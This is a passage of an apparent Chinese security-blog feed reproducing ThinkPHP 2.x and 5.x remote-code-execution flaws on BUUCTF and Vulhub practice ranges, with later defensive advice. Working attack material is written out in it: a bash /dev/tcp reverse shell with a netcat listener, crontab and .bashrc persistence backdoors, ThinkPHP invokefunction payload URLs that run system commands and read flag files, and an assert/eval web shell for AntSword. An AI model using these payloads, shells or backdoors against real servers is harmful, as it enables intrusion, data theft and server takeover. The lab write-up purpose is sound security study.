&lt;li&gt;在 Kali 上启动监听：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;nc -lvnp 4444&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;在蚁剑中执行：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/你的IP/4444 0&amp;gt;&amp;amp;1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;持久化后门&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;添加计划任务（crontab）定时反弹 Shell。&lt;/li&gt;
&lt;li&gt;修改 &lt;code&gt;.bashrc&lt;/code&gt; 文件，添加后门命令。&lt;/li&gt;
&lt;li&gt;写入定时任务（如每分钟执行反弹 Shell）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;三、ThinkPHP-5-x-RCE-漏洞复现&#34;&gt;&lt;a href=&#34;#三、ThinkPHP-5-x-RCE-漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;三、ThinkPHP 5.x RCE 漏洞复现&#34;&gt;&lt;/a&gt;三、ThinkPHP 5.x RCE 漏洞复现&lt;/h2&gt;&lt;h3 id=&#34;1-靶场环境-1&#34;&gt;&lt;a href=&#34;#1-靶场环境-1&#34; class=&#34;headerlink&#34; title=&#34;1. 靶场环境&#34;&gt;&lt;/a&gt;1. 靶场环境&lt;/h3&gt;&lt;p&gt;BUUCTF 提供 ThinkPHP 5.x 在线靶场：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x RCE 漏洞地址&lt;/strong&gt;：&lt;code&gt;https://buuoj.cn/challenges#[ThinkPHP]5-Rce&lt;/code&gt;&lt;br&gt;开启靶场，访问页面显示：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight armasm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs armasm&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;ThinkPHP&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;V5&lt;/span&gt;&lt;br&gt;十年磨一剑 - 为 API 开发设计的高性能框架&lt;br&gt;[ &lt;span class=&#34;hljs-built_in&#34;&gt;V5&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; 版本由 七牛云 独家赞助发布 ]&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这表明靶场运行 ThinkPHP 5.x（版本 &amp;lt;&amp;#x3D; 5.0.23），漏洞复现环境已就绪 。&lt;/p&gt;
&lt;h3 id=&#34;2-漏洞原理-1&#34;&gt;&lt;a href=&#34;#2-漏洞原理-1&#34; class=&#34;headerlink&#34; title=&#34;2. 漏洞原理&#34;&gt;&lt;/a&gt;2. 漏洞原理&lt;/h3&gt;&lt;p&gt;ThinkPHP 5.x 的 RCE 漏洞源于框架对 &lt;code&gt;\think\app::invokefunction&lt;/code&gt; 方法的未授权访问。攻击者可通过 URL 参数调用 &lt;code&gt;call_user_func_array&lt;/code&gt; 函数，动态执行任意 PHP 函数（如 &lt;code&gt;phpinfo&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt;），并传递参数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用链&lt;/strong&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sas&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;.php&lt;br&gt;└── ?s=&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;/\think\app/invokefunction&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;function&lt;/span&gt;=call_user_func_array&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;vars&lt;/span&gt;[0]=phpinfo&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;vars&lt;/span&gt;[1][]=-1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;参数说明&lt;/strong&gt;：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;含义说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;s&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;ThinkPHP 路由，访问框架核心类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;function&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;被调用的函数（如 &lt;code&gt;call_user_func_array&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[0]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;实际调用的函数名称（如 &lt;code&gt;phpinfo&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[1][]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;函数参数数组（如 &lt;code&gt;whoami&lt;/code&gt;、&lt;code&gt;-1&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;3-漏洞利用过程-1&#34;&gt;&lt;a href=&#34;#3-漏洞利用过程-1&#34; class=&#34;headerlink&#34; title=&#34;3. 漏洞利用过程&#34;&gt;&lt;/a&gt;3. 漏洞利用过程&lt;/h3&gt;&lt;h4 id=&#34;步骤-1：信息探测（测试-phpinfo）&#34;&gt;&lt;a href=&#34;#步骤-1：信息探测（测试-phpinfo）&#34; class=&#34;headerlink&#34; title=&#34;步骤 1：信息探测（测试 phpinfo）&#34;&gt;&lt;/a&gt;步骤 1：信息探测（测试 &lt;code&gt;phpinfo&lt;/code&gt;）&lt;/h4&gt;&lt;p&gt;构造 Payload 测试漏洞：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=phpinfo&amp;amp;vars[1][]=-1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回完整的 &lt;code&gt;phpinfo()&lt;/code&gt; 信息，证明漏洞存在且可利用。&lt;/p&gt;
&lt;h4 id=&#34;步骤-2：执行系统命令（whoami）&#34;&gt;&lt;a href=&#34;#步骤-2：执行系统命令（whoami）&#34; class=&#34;headerlink&#34; title=&#34;步骤 2：执行系统命令（whoami）&#34;&gt;&lt;/a&gt;步骤 2：执行系统命令（&lt;code&gt;whoami&lt;/code&gt;）&lt;/h4&gt;&lt;p&gt;修改 Payload 执行 &lt;code&gt;whoami&lt;/code&gt; 命令：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回：&lt;/p&gt;
&lt;figure class=&#34;highlight haskell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;表明 Web 服务以 &lt;code&gt;www-data&lt;/code&gt; 用户运行，命令执行成功。&lt;/p&gt;
&lt;h4 id=&#34;步骤-3：读取-Flag-文件-1&#34;&gt;&lt;a href=&#34;#步骤-3：读取-Flag-文件-1&#34; class=&#34;headerlink&#34; title=&#34;步骤 3：读取 Flag 文件&#34;&gt;&lt;/a&gt;步骤 3：读取 Flag 文件&lt;/h4&gt;&lt;p&gt;尝试读取 &lt;code&gt;/flag&lt;/code&gt; 或根目录下的 &lt;code&gt;flag&lt;/code&gt; 文件：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=cat+/flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;或：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=cat+/var/www/html/flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回类似：&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;flag&lt;/span&gt;&amp;#123;d64e3f2e-xxxx-xxxx-xxxx-&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;ed8fe1b43f3&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;4-使用蚁剑连接-1&#34;&gt;&lt;a href=&#34;#4-使用蚁剑连接-1&#34; class=&#34;headerlink&#34; title=&#34;4. 使用蚁剑连接&#34;&gt;&lt;/a&gt;4. 使用蚁剑连接&lt;/h3&gt;&lt;p&gt;与 ThinkPHP 2.x 类似，可构造 POST 参数的一句话木马：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=assert&amp;amp;vars[1][]=eval($_POST[1])&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;蚁剑配置&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;：上述地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;密码&lt;/strong&gt;：&lt;code&gt;1&lt;/code&gt;（对应 &lt;code&gt;$_POST[1]&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：PHP（原生）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;编码&lt;/strong&gt;：默认&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;连接后可进行文件管理、命令执行等操作。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;四、防御措施&#34;&gt;&lt;a href=&#34;#四、防御措施&#34; class=&#34;headerlink&#34; title=&#34;四、防御措施&#34;&gt;&lt;/a&gt;四、防御措施&lt;/h2&gt;&lt;h3 id=&#34;1-升级-ThinkPHP-版本&#34;&gt;&lt;a href=&#34;#1-升级-ThinkPHP-版本&#34; class=&#34;headerlink&#34; title=&#34;1. 升级 ThinkPHP 版本&#34;&gt;&lt;/a&gt;1. 升级 ThinkPHP 版本&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x&lt;/strong&gt;：升级到更高版本（如 3.x 或 5.0.24+），修复模板解析漏洞。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x&lt;/strong&gt;：升级到 5.0.24 或更高版本，官方已修复 RCE 漏洞。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-输入验证与过滤&#34;&gt;&lt;a href=&#34;#2-输入验证与过滤&#34; class=&#34;headerlink&#34; title=&#34;2. 输入验证与过滤&#34;&gt;&lt;/a&gt;2. 输入验证与过滤&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;白名单验证&lt;/strong&gt;：限制 &lt;code&gt;s&lt;/code&gt; 参数和模板变量，只允许预定义值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;过滤危险函数&lt;/strong&gt;：禁用 &lt;code&gt;eval&lt;/code&gt;、&lt;code&gt;assert&lt;/code&gt;、&lt;code&gt;call_user_func_array&lt;/code&gt; 等高危函数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;参数校验&lt;/strong&gt;：对用户输入进行严格过滤，防止注入。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-禁用危险函数&#34;&gt;&lt;a href=&#34;#3-禁用危险函数&#34; class=&#34;headerlink&#34; title=&#34;3. 禁用危险函数&#34;&gt;&lt;/a&gt;3. 禁用危险函数&lt;/h3&gt;&lt;p&gt;在 &lt;code&gt;php.ini&lt;/code&gt; 中禁用高危函数：&lt;/p&gt;
&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;disable_functions&lt;/span&gt; = eval,assert,exec,system,passthru,shell_exec,proc_open,call_user_func_array&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;4-最小权限原则&#34;&gt;&lt;a href=&#34;#4-最小权限原则&#34; class=&#34;headerlink&#34; title=&#34;4. 最小权限原则&#34;&gt;&lt;/a&gt;4. 最小权限原则&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;配置 Web 服务器以最低权限运行（如非 root 用户）。&lt;/li&gt;
&lt;li&gt;限制 PHP 脚本的文件系统访问权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-Web-应用防火墙（WAF）&#34;&gt;&lt;a href=&#34;#5-Web-应用防火墙（WAF）&#34; class=&#34;headerlink&#34; title=&#34;5. Web 应用防火墙（WAF）&#34;&gt;&lt;/a&gt;5. Web 应用防火墙（WAF）&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;部署 WAF，拦截包含可疑路由（如 &lt;code&gt;\think\app&lt;/code&gt;）或函数（如 &lt;code&gt;system&lt;/code&gt;）的请求。&lt;/li&gt;
&lt;li&gt;使用正则规则匹配异常 Payload。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6-安全审计与监控&#34;&gt;&lt;a href=&#34;#6-安全审计与监控&#34; class=&#34;headerlink&#34; title=&#34;6. 安全审计与监控&#34;&gt;&lt;/a&gt;6. 安全审计与监控&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;定期扫描 Web 应用，检查已知漏洞。&lt;/li&gt;
&lt;li&gt;监控服务器日志，及时发现异常请求。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;五、总结&#34;&gt;&lt;a href=&#34;#五、总结&#34; class=&#34;headerlink&#34; title=&#34;五、总结&#34;&gt;&lt;/a&gt;五、总结&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;ThinkPHP 2.x RCE&lt;/th&gt;
&lt;th&gt;ThinkPHP 5.x RCE&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;漏洞名称&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;ThinkPHP 2.x RCE&lt;/td&gt;
&lt;td&gt;ThinkPHP 5.x RCE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;ThinkPHP 2.x&lt;/td&gt;
&lt;td&gt;ThinkPHP &amp;lt;&amp;#x3D; 5.0.23&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;漏洞原因&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;模板变量解析未过滤&lt;/td&gt;
&lt;td&gt;动态函数调用未授权&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;利用方法&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;GET&amp;#x2F;POST 参数构造 &lt;code&gt;eval&lt;/code&gt;&amp;#x2F;&lt;code&gt;assert&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;GET 请求构造路由 + 函数调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;关键函数&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;eval&lt;/code&gt;, &lt;code&gt;assert&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;检测方式&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;使用 &lt;code&gt;$&amp;#123;@phpinfo()&amp;#125;&lt;/code&gt; 探测&lt;/td&gt;
&lt;td&gt;使用 &lt;code&gt;phpinfo&lt;/code&gt; 探测，再尝试 &lt;code&gt;system&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;练习平台&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;BUUCTF（如 &lt;code&gt;node3.buuoj.cn:26104&lt;/code&gt;）&lt;/td&gt;
&lt;td&gt;BUUCTF（如 &lt;code&gt;node5.buuoj.cn:27945&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;ThinkPHP 2.x 和 5.x 的 RCE 漏洞利用简单但危害极大，攻击者可通过简单的 URL 构造实现代码或命令执行，甚至完全控制服务器。BUUCTF 靶场为我们提供了便捷的复现环境，通过本文的演示，读者可以深入理解漏洞原理和利用流程。开发者应及时升级框架、加强输入验证、部署 WAF 和监控机制，以有效防范此类漏洞。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="Web安全" />
        <category term="漏洞复现" />
        <category term="RCE" />
        <category term="ThinkPHP" />
        <updated>2025-07-28T06:18:44.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/</id>
        <title>ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/"/>
        <content type="html">&lt;h1 id=&#34;深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）&#34;&gt;&lt;a href=&#34;#深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）&#34; class=&#34;headerlink&#34; title=&#34;深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）&#34;&gt;&lt;/a&gt;深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）&lt;/h1&gt;&lt;h2 id=&#34;一、漏洞背景简介-🔍&#34;&gt;&lt;a href=&#34;#一、漏洞背景简介-🔍&#34; class=&#34;headerlink&#34; title=&#34;一、漏洞背景简介 🔍&#34;&gt;&lt;/a&gt;一、漏洞背景简介 🔍&lt;/h2&gt;&lt;p&gt;ThinkPHP 是一个轻量且易用的 PHP 开发框架，广泛应用于 Web 开发。然而，在 ThinkPHP 5.0.x 至 5.0.23 版本中，由于框架对动态函数调用（如 &lt;code&gt;invokeFunction&lt;/code&gt;）的访问控制不严格，存在严重的 &lt;strong&gt;远程代码执行（RCE）漏洞&lt;/strong&gt;。攻击者可通过精心构造的 URL 参数，调用任意 PHP 函数（如 &lt;code&gt;phpinfo&lt;/code&gt; 或 &lt;code&gt;system&lt;/code&gt;），实现远程执行任意代码或系统命令，危害极大。&lt;/p&gt;
&lt;p&gt;本文基于 Vulhub 靶场环境，详细讲解该漏洞的原理、环境搭建、利用过程及防御措施，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;二、漏洞环境搭建&#34;&gt;&lt;a href=&#34;#二、漏洞环境搭建&#34; class=&#34;headerlink&#34; title=&#34;二、漏洞环境搭建&#34;&gt;&lt;/a&gt;二、漏洞环境搭建&lt;/h2&gt;&lt;p&gt;为了复现 ThinkPHP 5.x RCE 漏洞，我们使用 Vulhub 提供的靶场环境，结合 Docker 和 Kali Linux 进行搭建。以下是详细步骤：&lt;/p&gt;
&lt;h3 id=&#34;1-基础环境&#34;&gt;&lt;a href=&#34;#1-基础环境&#34; class=&#34;headerlink&#34; title=&#34;1. 基础环境&#34;&gt;&lt;/a&gt;1. 基础环境&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Kali Linux（推荐使用虚拟机）  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工具&lt;/strong&gt;：已安装 Docker 和 Docker Compose  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络模式&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;NAT（用于访问外部网络）&lt;/li&gt;
&lt;li&gt;仅主机模式（Host-Only，Kali IP：&lt;code&gt;192.168.56.102&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;硬件要求&lt;/strong&gt;：建议 4GB 内存，2 核 CPU&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-获取-Vulhub-项目&#34;&gt;&lt;a href=&#34;#2-获取-Vulhub-项目&#34; class=&#34;headerlink&#34; title=&#34;2. 获取 Vulhub 项目&#34;&gt;&lt;/a&gt;2. 获取 Vulhub 项目&lt;/h3&gt;&lt;p&gt;Vulhub 是一个开源的漏洞靶场集合，包含 ThinkPHP 5.x RCE 环境。执行以下命令：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 切换到工作目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; 